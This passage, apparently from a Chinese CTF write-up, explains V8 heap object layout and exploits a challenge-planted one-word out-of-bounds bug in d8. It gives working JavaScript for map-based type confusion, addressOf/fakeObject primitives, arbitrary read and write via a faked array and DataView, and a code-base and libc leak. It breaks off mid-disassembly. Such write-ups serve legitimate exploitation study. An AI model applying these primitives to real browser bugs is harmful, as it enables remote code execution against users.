<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0xebe3f60df81</span><span class="number">-1</span> <span class="comment">/* JS_OBJECT_TYPE */</span></span><br><span class="line"><span class="number">0xebe3f60df80</span>:	<span class="number">0x000033a9ca10afe9</span>	<span class="number">0x00000ebe3f60eb41</span></span><br><span class="line"><span class="number">0xebe3f60df90</span>:	<span class="number">0x00000ebe3f60e019</span>	<span class="number">0x00000ebe3f60e221</span></span><br><span class="line"><span class="number">0xebe3f60dfa0</span>:	<span class="number">0x00000ebe3f60e291</span>	<span class="number">0x00000ebe3f60e339</span></span><br><span class="line"><span class="number">0xebe3f60dfb0</span>:	<span class="number">0x00000ebe3f60e3d9</span>	<span class="number">0x00000ebe3f60e491</span></span><br><span class="line"><span class="number">0xebe3f60dfc0</span>:	<span class="number">0x00000ebe3f60e561</span>	<span class="number">0x00000ebe3f60e649</span></span><br><span class="line"><span class="number">0xebe3f60dfd0</span>:	<span class="number">0x00000ebe3f60e749</span>	<span class="number">0x00000ebe3f60e861</span></span><br><span class="line"><span class="number">0xebe3f60dfe0</span>:	<span class="number">0x00000ebe3f60e9a9</span>	<span class="number">0x00000bb728040941</span></span><br><span class="line"><span class="number">0xebe3f60dff0</span>:	<span class="number">0x0000000800000003</span>	<span class="number">0x30746e656d656c65</span></span><br><span class="line"><span class="number">0xebe3f60e000</span>:	<span class="number">0x00000bb728040801</span>	<span class="number">0x0000000100000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>前3个数据分别为 <code>map properties elements</code> 的地址</li>
<li>接下来的10个一字空间分别用于存储 [<code>property0</code>：<code>property9</code>]</li>
<li>PS：没有使用指针压缩技术（直接把8字节的指针存入内存）</li>
</ul>
<p>V8 拥有两种类似的属性：</p>
<ul>
<li>索引属性（Array-indexed Properties） </li>
<li>命名属性（Named Properties） </li>
</ul>
<p>V8 遍历时一般会先遍历前者，前后两者在底层存储在两个单独的数据结构中，分别用 <code>elements</code> 和 <code>properties</code> 两个指针指向它们</p>
<ul>
<li>如果命名属性少于等于10个时，命名属性会直接存储到对象本身，而无需先通过 properties 指针查询（直接存储到对象本身的属性被称为对象内属性 In-object Properties）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x00000ebe3f60eb41</span><span class="number">-1</span> <span class="comment">/* properties */</span></span><br><span class="line"><span class="number">0xebe3f60eb40</span>:	<span class="number">0x00000bb728041909</span>	<span class="number">0x0000000300000000</span></span><br><span class="line"><span class="number">0xebe3f60eb50</span>:	<span class="number">0x00000ebe3f60e9e9</span>	<span class="number">0x00000ebe3f60eb89</span></span><br><span class="line"><span class="number">0xebe3f60eb60</span>:	<span class="number">0x00000bb7280404d1</span>	<span class="number">0x00000bb728041f49</span></span><br></pre></td></tr></table></figure>
<ul>
<li>从第3个指针开始，就是：[<code>property10</code>：<code>property11</code>]（前10个存储在对象内部）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x00000ebe3f60e019</span><span class="number">-1</span> <span class="comment">/* elements */</span></span><br><span class="line"><span class="number">0xebe3f60e018</span>:	<span class="number">0x00000bb728040801</span>	<span class="number">0x0000001100000000</span></span><br><span class="line"><span class="number">0xebe3f60e028</span>:	<span class="number">0x00000ebe3f60dfe9</span>	<span class="number">0x00000ebe3f60e0e9</span></span><br><span class="line"><span class="number">0xebe3f60e038</span>:	<span class="number">0x00000ebe3f60e101</span>	<span class="number">0x00000ebe3f60e119</span></span><br></pre></td></tr></table></figure>
<ul>
<li>从第3个指针开始，就是：[<code>element0</code>：<code>element11</code>]</li>
</ul>
<p>对于本题目来说，更重要的特性是：</p>
<ul>
<li>JSArray 对象的 <code>elements</code> 就分配在 JSArray 的相邻上方</li>
</ul>
<p>测试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(floatArray)</span><br><span class="line"><span class="number">0x116973d4e061</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>]</span><br></pre></td></tr></table></figure>
<ul>
<li>JSArray 所在地址为 <code>0x116973d4e061-1</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x116973d4e061</span> <span class="comment">/* JSArray */</span></span><br><span class="line"><span class="number">0x116973d4e061</span>: [JSArray]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0177b6302ed9</span> &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x3b1820a11111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - elements: <span class="number">0x116973d4e039</span> &lt;FixedDoubleArray[<span class="number">3</span>]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: <span class="number">3</span></span><br><span class="line"> - properties: <span class="number">0x2ad6f06c0c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x3c17ff4801a9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x116973d4e039</span> &lt;FixedDoubleArray[<span class="number">3</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1.11</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2.22</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3.33</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x116973d4e039</span> <span class="comment">/* JSArray-&gt;elements */</span></span><br><span class="line"><span class="number">0x116973d4e039</span>: [FixedDoubleArray]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x2ad6f06c14f9</span> &lt;Map&gt;</span><br><span class="line"> - length: <span class="number">3</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1.11</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2.22</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3.33</span></span><br></pre></td></tr></table></figure>
<ul>
<li>JSArray-&gt;elements 所在地址为 <code>0x116973d4e039-1</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &#123;<span class="keyword">double</span>&#125;(<span class="number">0x116973d4e048</span>)</span><br><span class="line">$<span class="number">1</span> = <span class="number">1.1100000000000001</span></span><br><span class="line">pwndbg&gt; p &#123;<span class="keyword">double</span>&#125;(<span class="number">0x116973d4e050</span>)</span><br><span class="line">$<span class="number">2</span> = <span class="number">2.2200000000000002</span></span><br><span class="line">pwndbg&gt; p &#123;<span class="keyword">double</span>&#125;(<span class="number">0x116973d4e058</span>)</span><br><span class="line">$<span class="number">3</span> = <span class="number">3.3300000000000001</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现：JSArray-&gt;elements 和 JSArray 是相邻的</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>我们拥有一字的越界写和一字的越界写</p>
<p>这一字的越界读刚好可以泄露出 JSArray-&gt;map：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line">var mapFloatArray = floatArray.oob();</span><br><span class="line"></span><br><span class="line">d8&gt; %DebugPrint(floatArray)</span><br><span class="line"><span class="number">0x1a4e1c98e3b1</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>]</span><br><span class="line">d8&gt; %DebugPrint(mapFloatArray)</span><br><span class="line"><span class="number">0x1a4e1c98e3d1</span> &lt;HeapNumber <span class="number">1.81206e-310</span>&gt;</span><br><span class="line"><span class="number">1.81206045893503e-310</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/<span class="number">10</span>xg <span class="number">0x1a4e1c98e3b1</span><span class="number">-1</span> </span><br><span class="line"><span class="number">0x1a4e1c98e3b0</span>:	<span class="number">0x0000215b6a782ed9</span>	<span class="number">0x00001a2de1f40c71</span> <span class="comment">// floatArray</span></span><br><span class="line"><span class="number">0x1a4e1c98e3c0</span>:	<span class="number">0x00001a4e1c98e389</span>	<span class="number">0x0000000300000000</span></span><br><span class="line"><span class="number">0x1a4e1c98e3d0</span>:	<span class="number">0x00001a2de1f40561</span>	<span class="number">0x0000215b6a782ed9</span> <span class="comment">// mapFloatArray</span></span><br></pre></td></tr></table></figure>
<p>而一字的越界写则可以对 JSArray-&gt;map 进行覆盖，既然可以操作 JSArray-&gt;map，那么最优的利用方式肯定就是类型混淆：</p>
<ul>
<li>由于 JSArray 是利用 <code>map</code> 来判断一个 <code>elements</code> 到底是数字还是指针</li>
<li>如果我们可以修改 <code>map</code>，就可以触发干扰 V8 对类型的判断</li>
</ul>
<p>常见的类型混淆如下：</p>
<ul>
<li>指针 -&gt; Double：数字类型可以直接获取数值（用于泄露某个 JS 对象的地址）</li>
<li>Double -&gt; 指针：指针类型会被当做一个对象（用于伪造一个 JS 对象，用于 WAA/RAA）</li>
</ul>
<p>具体代码细节如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">yhellow</span>:<span class="string">&quot;yhellow&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> mapFloatArray = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> mapObjArray = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = target;           </span><br><span class="line">    objArray.oob(mapFloatArray); <span class="comment">/* 指针-&gt;Double:使指针的地址可以直接被获取 */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = objArray[<span class="number">0</span>];         </span><br><span class="line">    objArray.oob(mapObjArray);      </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = target;        </span><br><span class="line">    floatArray.oob(mapObjArray); <span class="comment">/* Double-&gt;指针:令V8把floatArray当做一个对象 */</span>   </span><br><span class="line">                                    </span><br><span class="line">    <span class="keyword">let</span> ret = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(mapFloatArray);  </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来就要实现 WAA 和 RAA，可以通过将 JSArray-&gt;elements 数组伪造成一个数组对象，实现任意地址读写</p>
<ul>
<li>在 <code>elements[0]</code> 写入一个数组的 <code>map</code>，在 <code>elements[2]</code> 写入 <code>target - 0x10</code></li>
<li>然后再用 <code>fakeObject</code> 方法将 <code>elements[0]</code> 的地址伪造成一个对象 <code>fake_array</code></li>
<li>再对 <code>fake_array[0]</code> 进行读写，实际上就是对目标地址进行读写了 </li>
</ul>
<p>模型如下：</p>
<p><img src="/2022/12/06/V8+JavaScript%20pwn+%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/1670253514098.png" alt="1670253514098"> </p>
<p>详细代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> floatArrayAddr = addressOf(floatArray);</span><br><span class="line"><span class="keyword">var</span> floatArrayElement = floatArrayAddr - <span class="number">0x28n</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x03d9b124ecc1 0x3d9b124ece9</span></span><br><span class="line"><span class="comment">0x3d9b124ecc1-&gt;0x3d9b124ece9 is 0x28 bytes (0x5 words)</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = floatArrayElement + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fakeArray = fakeObject(i2f(fakeArrayAddr));</span><br><span class="line">floatArray[<span class="number">0</span>] = mapFloatArray;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RAA</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> +<span class="number">0x1n</span>); </span><br><span class="line">    <span class="keyword">let</span> data = fakeArray[<span class="number">0</span>];     </span><br><span class="line">    <span class="keyword">return</span> f2i(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> dataView = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> -<span class="number">0x1n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAA</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>); </span><br><span class="line">    fakeArray[<span class="number">0</span>] = i2f(value);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAADataview</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WAA(bufBackStore, addr);</span><br><span class="line">    dataView.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>任意写 WAA 这里需要注意一下，由于 V8 的保护，不能直接将数据写入 <code>free_hook</code>，需要 <code>Dataview</code> 作为中介</li>
</ul>
<p>接着需要完成 <code>libc_base</code> 的泄露：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">60f</span>:<span class="number">3078</span>│  <span class="number">0x3553ea18a218</span> —▸ <span class="number">0x55b0ea5048b0</span> ◂— push   rbp</span><br><span class="line"><span class="number">610</span>:<span class="number">3080</span>│  <span class="number">0x3553ea18a220</span> —▸ <span class="number">0x2c5438080b71</span> ◂— <span class="number">0x200002c54380801</span></span><br><span class="line"><span class="number">611</span>:<span class="number">3088</span>│  <span class="number">0x3553ea18a228</span> —▸ <span class="number">0x55b0ea5048b0</span> ◂— push   rbp</span><br><span class="line"><span class="number">612</span>:<span class="number">3090</span>│  <span class="number">0x3553ea18a230</span> —▸ <span class="number">0x17dca8789009</span> ◂— <span class="number">0x700002c54380801</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 <code>objAddr - 0x8000</code> 后面有一些特殊的指令 <code>push rbp</code></li>
<li>可以利用这里泄露出 <code>pro_base</code></li>
<li>然后就可以利用 <code>pro_base</code> 计算出 GOT 表地址，并泄露出 <code>libc_base</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    let push_rbp = RAA(searchBase);</span><br><span class="line">    <span class="keyword">if</span>((push_rbp &amp; <span class="number">0xfff</span>n) == <span class="number">0x8b0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        60f:3078│  0x3553ea18a218 —▸ 0x55b0ea5048b0 ◂— push   rbp</span></span><br><span class="line"><span class="comment">        610:3080│  0x3553ea18a220 —▸ 0x2c5438080b71 ◂— 0x200002c54380801</span></span><br><span class="line"><span class="comment">        611:3088│  0x3553ea18a228 —▸ 0x55b0ea5048b0 ◂— push   rbp</span></span><br><span class="line"><span class="comment">        612:3090│  0x3553ea18a230 —▸ 0x17dca8789009 ◂— 0x700002c54380801</span></span><br><span class="line"><span class="comment">        */</span> </span><br><span class="line">        let push_rbp2 = RAA(push_rbp);</span><br><span class="line">        <span class="keyword">if</span> (push_rbp2 == <span class="number">0x56415741e5894855</span>n)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            pwndbg&gt; x/xg 0x55b0ea5048b0</span></span><br><span class="line"><span class="comment">            0x55b0ea5048b0 &lt;v8::(anonymous namespace)::WebAssemblyInstantiate(v8::FunctionCallbackInfo&lt;v8::Value&gt; const&amp;)&gt;:	0x56415741e5894855</span></span><br><span class="line"><span class="comment">            */</span> </span><br><span class="line">            leak_addr = push_rbp;</span><br><span class="line">            pro_base = leak_addr - <span class="number">0xe618b0</span>n;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            pwndbg&gt; distance 0x55b0e96a3000 0x55b0ea5048b0</span></span><br><span class="line"><span class="comment">            0x55b0e96a3000-&gt;0x55b0ea5048b0 is 0xe618b0 bytes (0x1cc316 words)</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            console.<span class="built_in">log</span>(hex(searchBase) + <span class="string">&quot; -&gt; &quot;</span> +hex(leak_addr));</span><br><span class="line">            console.<span class="built_in">log</span>(<span class="string">&quot;[*] d8 base : &quot;</span> + hex(pro_base));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    searchBase += <span class="number">8</span>n</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种泄露并不稳定，有许多偏移都需要手动计算，下面是一种稳定的泄露：</p>
<ul>
<li>打印 <code>floatArray-&gt;ArrayConstructor</code> 属性：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; %DebugPrint(floatArray.constructor);</span><br><span class="line"><span class="number">0x2be6ab0d0ec1</span> &lt;<span class="function">JSFunction <span class="title">Array</span> <span class="params">(sfi = <span class="number">0x24cf5e806791</span>)</span>&gt;</span></span><br><span class="line"><span class="function">function <span class="title">Array</span><span class="params">()</span> </span>&#123; [native code] &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x2be6ab0d0ec1</span></span><br><span class="line"><span class="number">0x2be6ab0d0ec1</span>: [Function] in OldSpace</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x36ed8a1c2d49</span> &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x2be6ab0c2109</span> &lt;JSFunction (sfi = <span class="number">0x24cf5e803b29</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x0310c3c80c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: <span class="number">0x2be6ab0d1111</span> &lt;JSArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - initial_map: <span class="number">0x36ed8a1c2d99</span> &lt;Map(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - shared_info: <span class="number">0x24cf5e806791</span> &lt;SharedFunctionInfo Array&gt;</span><br><span class="line"> - name: <span class="number">0x0310c3c83599</span> &lt;String[#<span class="number">5</span>]: Array&gt;</span><br><span class="line"> - builtin: ArrayConstructor</span><br><span class="line"> - formal_parameter_count: <span class="number">65535</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x2be6ab0c1869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x01c365606981</span> &lt;Code BUILTIN ArrayConstructor&gt;</span><br><span class="line"> - properties: <span class="number">0x2be6ab0d1029</span> &lt;PropertyArray[<span class="number">6</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x24cf5e8004b9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#name: 0x24cf5e800449 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#prototype: 0x24cf5e800529 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="number">0x0310c3c84c79</span> &lt;Symbol: (native_context_index_symbol)&gt;: <span class="number">11</span> (<span class="keyword">const</span> data field <span class="number">0</span>) properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x0310c3c84f41</span> &lt;Symbol: Symbol.species&gt;: <span class="number">0x2be6ab0d0fd9</span> &lt;AccessorPair&gt; (<span class="keyword">const</span> accessor descriptor)</span><br><span class="line">    #isArray: <span class="number">0x2be6ab0d1069</span> &lt;<span class="function">JSFunction <span class="title">isArray</span> <span class="params">(sfi = <span class="number">0x24cf5e806829</span>)</span>&gt; <span class="params">(<span class="keyword">const</span> data field <span class="number">1</span>)</span> properties[1]</span></span><br><span class="line"><span class="function">    <span class="meta">#from: 0x2be6ab0d10a1 <span class="meta-string">&lt;JSFunction from (sfi = 0x24cf5e806879)&gt;</span> (const data field 2) properties[2]</span></span></span><br><span class="line"><span class="function">    <span class="meta">#of: 0x2be6ab0d10d9 <span class="meta-string">&lt;JSFunction of (sfi = 0x24cf5e8068b1)&gt;</span> (const data field 3) properties[3]</span></span></span><br><span class="line"><span class="function"> &#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> - feedback <span class="built_in">vector</span>: <span class="keyword">not</span> available</span></span><br></pre></td></tr></table></figure>
<ul>
<li>打印 <code>floatArray-&gt;ArrayConstructor-&gt;code</code> 属性：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; job <span class="number">0x01c365606981</span></span><br><span class="line"><span class="number">0x1c365606981</span>: [Code]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x0310c3c80a31</span> &lt;Map&gt;</span><br><span class="line">kind = BUILTIN</span><br><span class="line">name = ArrayConstructor</span><br><span class="line">compiler = turbofan</span><br><span class="line">address = <span class="number">0x7fff49059878</span></span><br><span class="line"></span><br><span class="line">Trampoline (size = <span class="number">13</span>)</span><br><span class="line"><span class="number">0x1c3656069c0</span>     <span class="number">0</span>  <span class="number">49b</span>a80c7ae5c40560000 REX.W movq r10,<span class="number">0x56405caec780</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x1c3656069ca</span>     a  <span class="number">41f</span>fe2         jmp r10</span><br><span class="line"></span><br><span class="line">Instructions (size = <span class="number">28</span>)</span><br><span class="line"><span class="number">0x56405caec780</span>     <span class="number">0</span>  <span class="number">493955</span>d8       REX.W cmpq [r13<span class="number">-0x28</span>] (root (undefined_value)),rdx</span><br><span class="line"><span class="number">0x56405caec784</span>     <span class="number">4</span>  <span class="number">7405</span>           jz <span class="number">0x56405caec78b</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x56405caec786</span>     <span class="number">6</span>  <span class="number">488b</span>ca         REX.W movq rcx,rdx</span><br><span class="line"><span class="number">0x56405caec789</span>     <span class="number">9</span>  eb03           jmp <span class="number">0x56405caec78e</span>  (ArrayConstructor)</span><br><span class="line"><span class="number">0x56405caec78b</span>     b  <span class="number">488b</span>cf         REX.W movq rcx,rdi</span><br><span class="line"><span class="number">0x56405caec78e</span>     e  <span class="number">498b</span>5dd8       REX.W movq rbx,[r13<span class="number">-0x28</span>] (root (undefined_value))</span><br><span class="line"><span class="number">0x56405caec792</span>    <span class="number">12</span>  <span class="number">488b</span>d1         REX.W movq rdx,rcx</span><br><span class="line"><span class="number">0x56405caec795</span>    <span class="number">15</span>  e926000000     jmp <span class="number">0x56405caec7c0</span>  (ArrayConstructorImpl)</span><br><span class="line"><span class="number">0x56405caec79a</span>    <span class="number">1</span>a 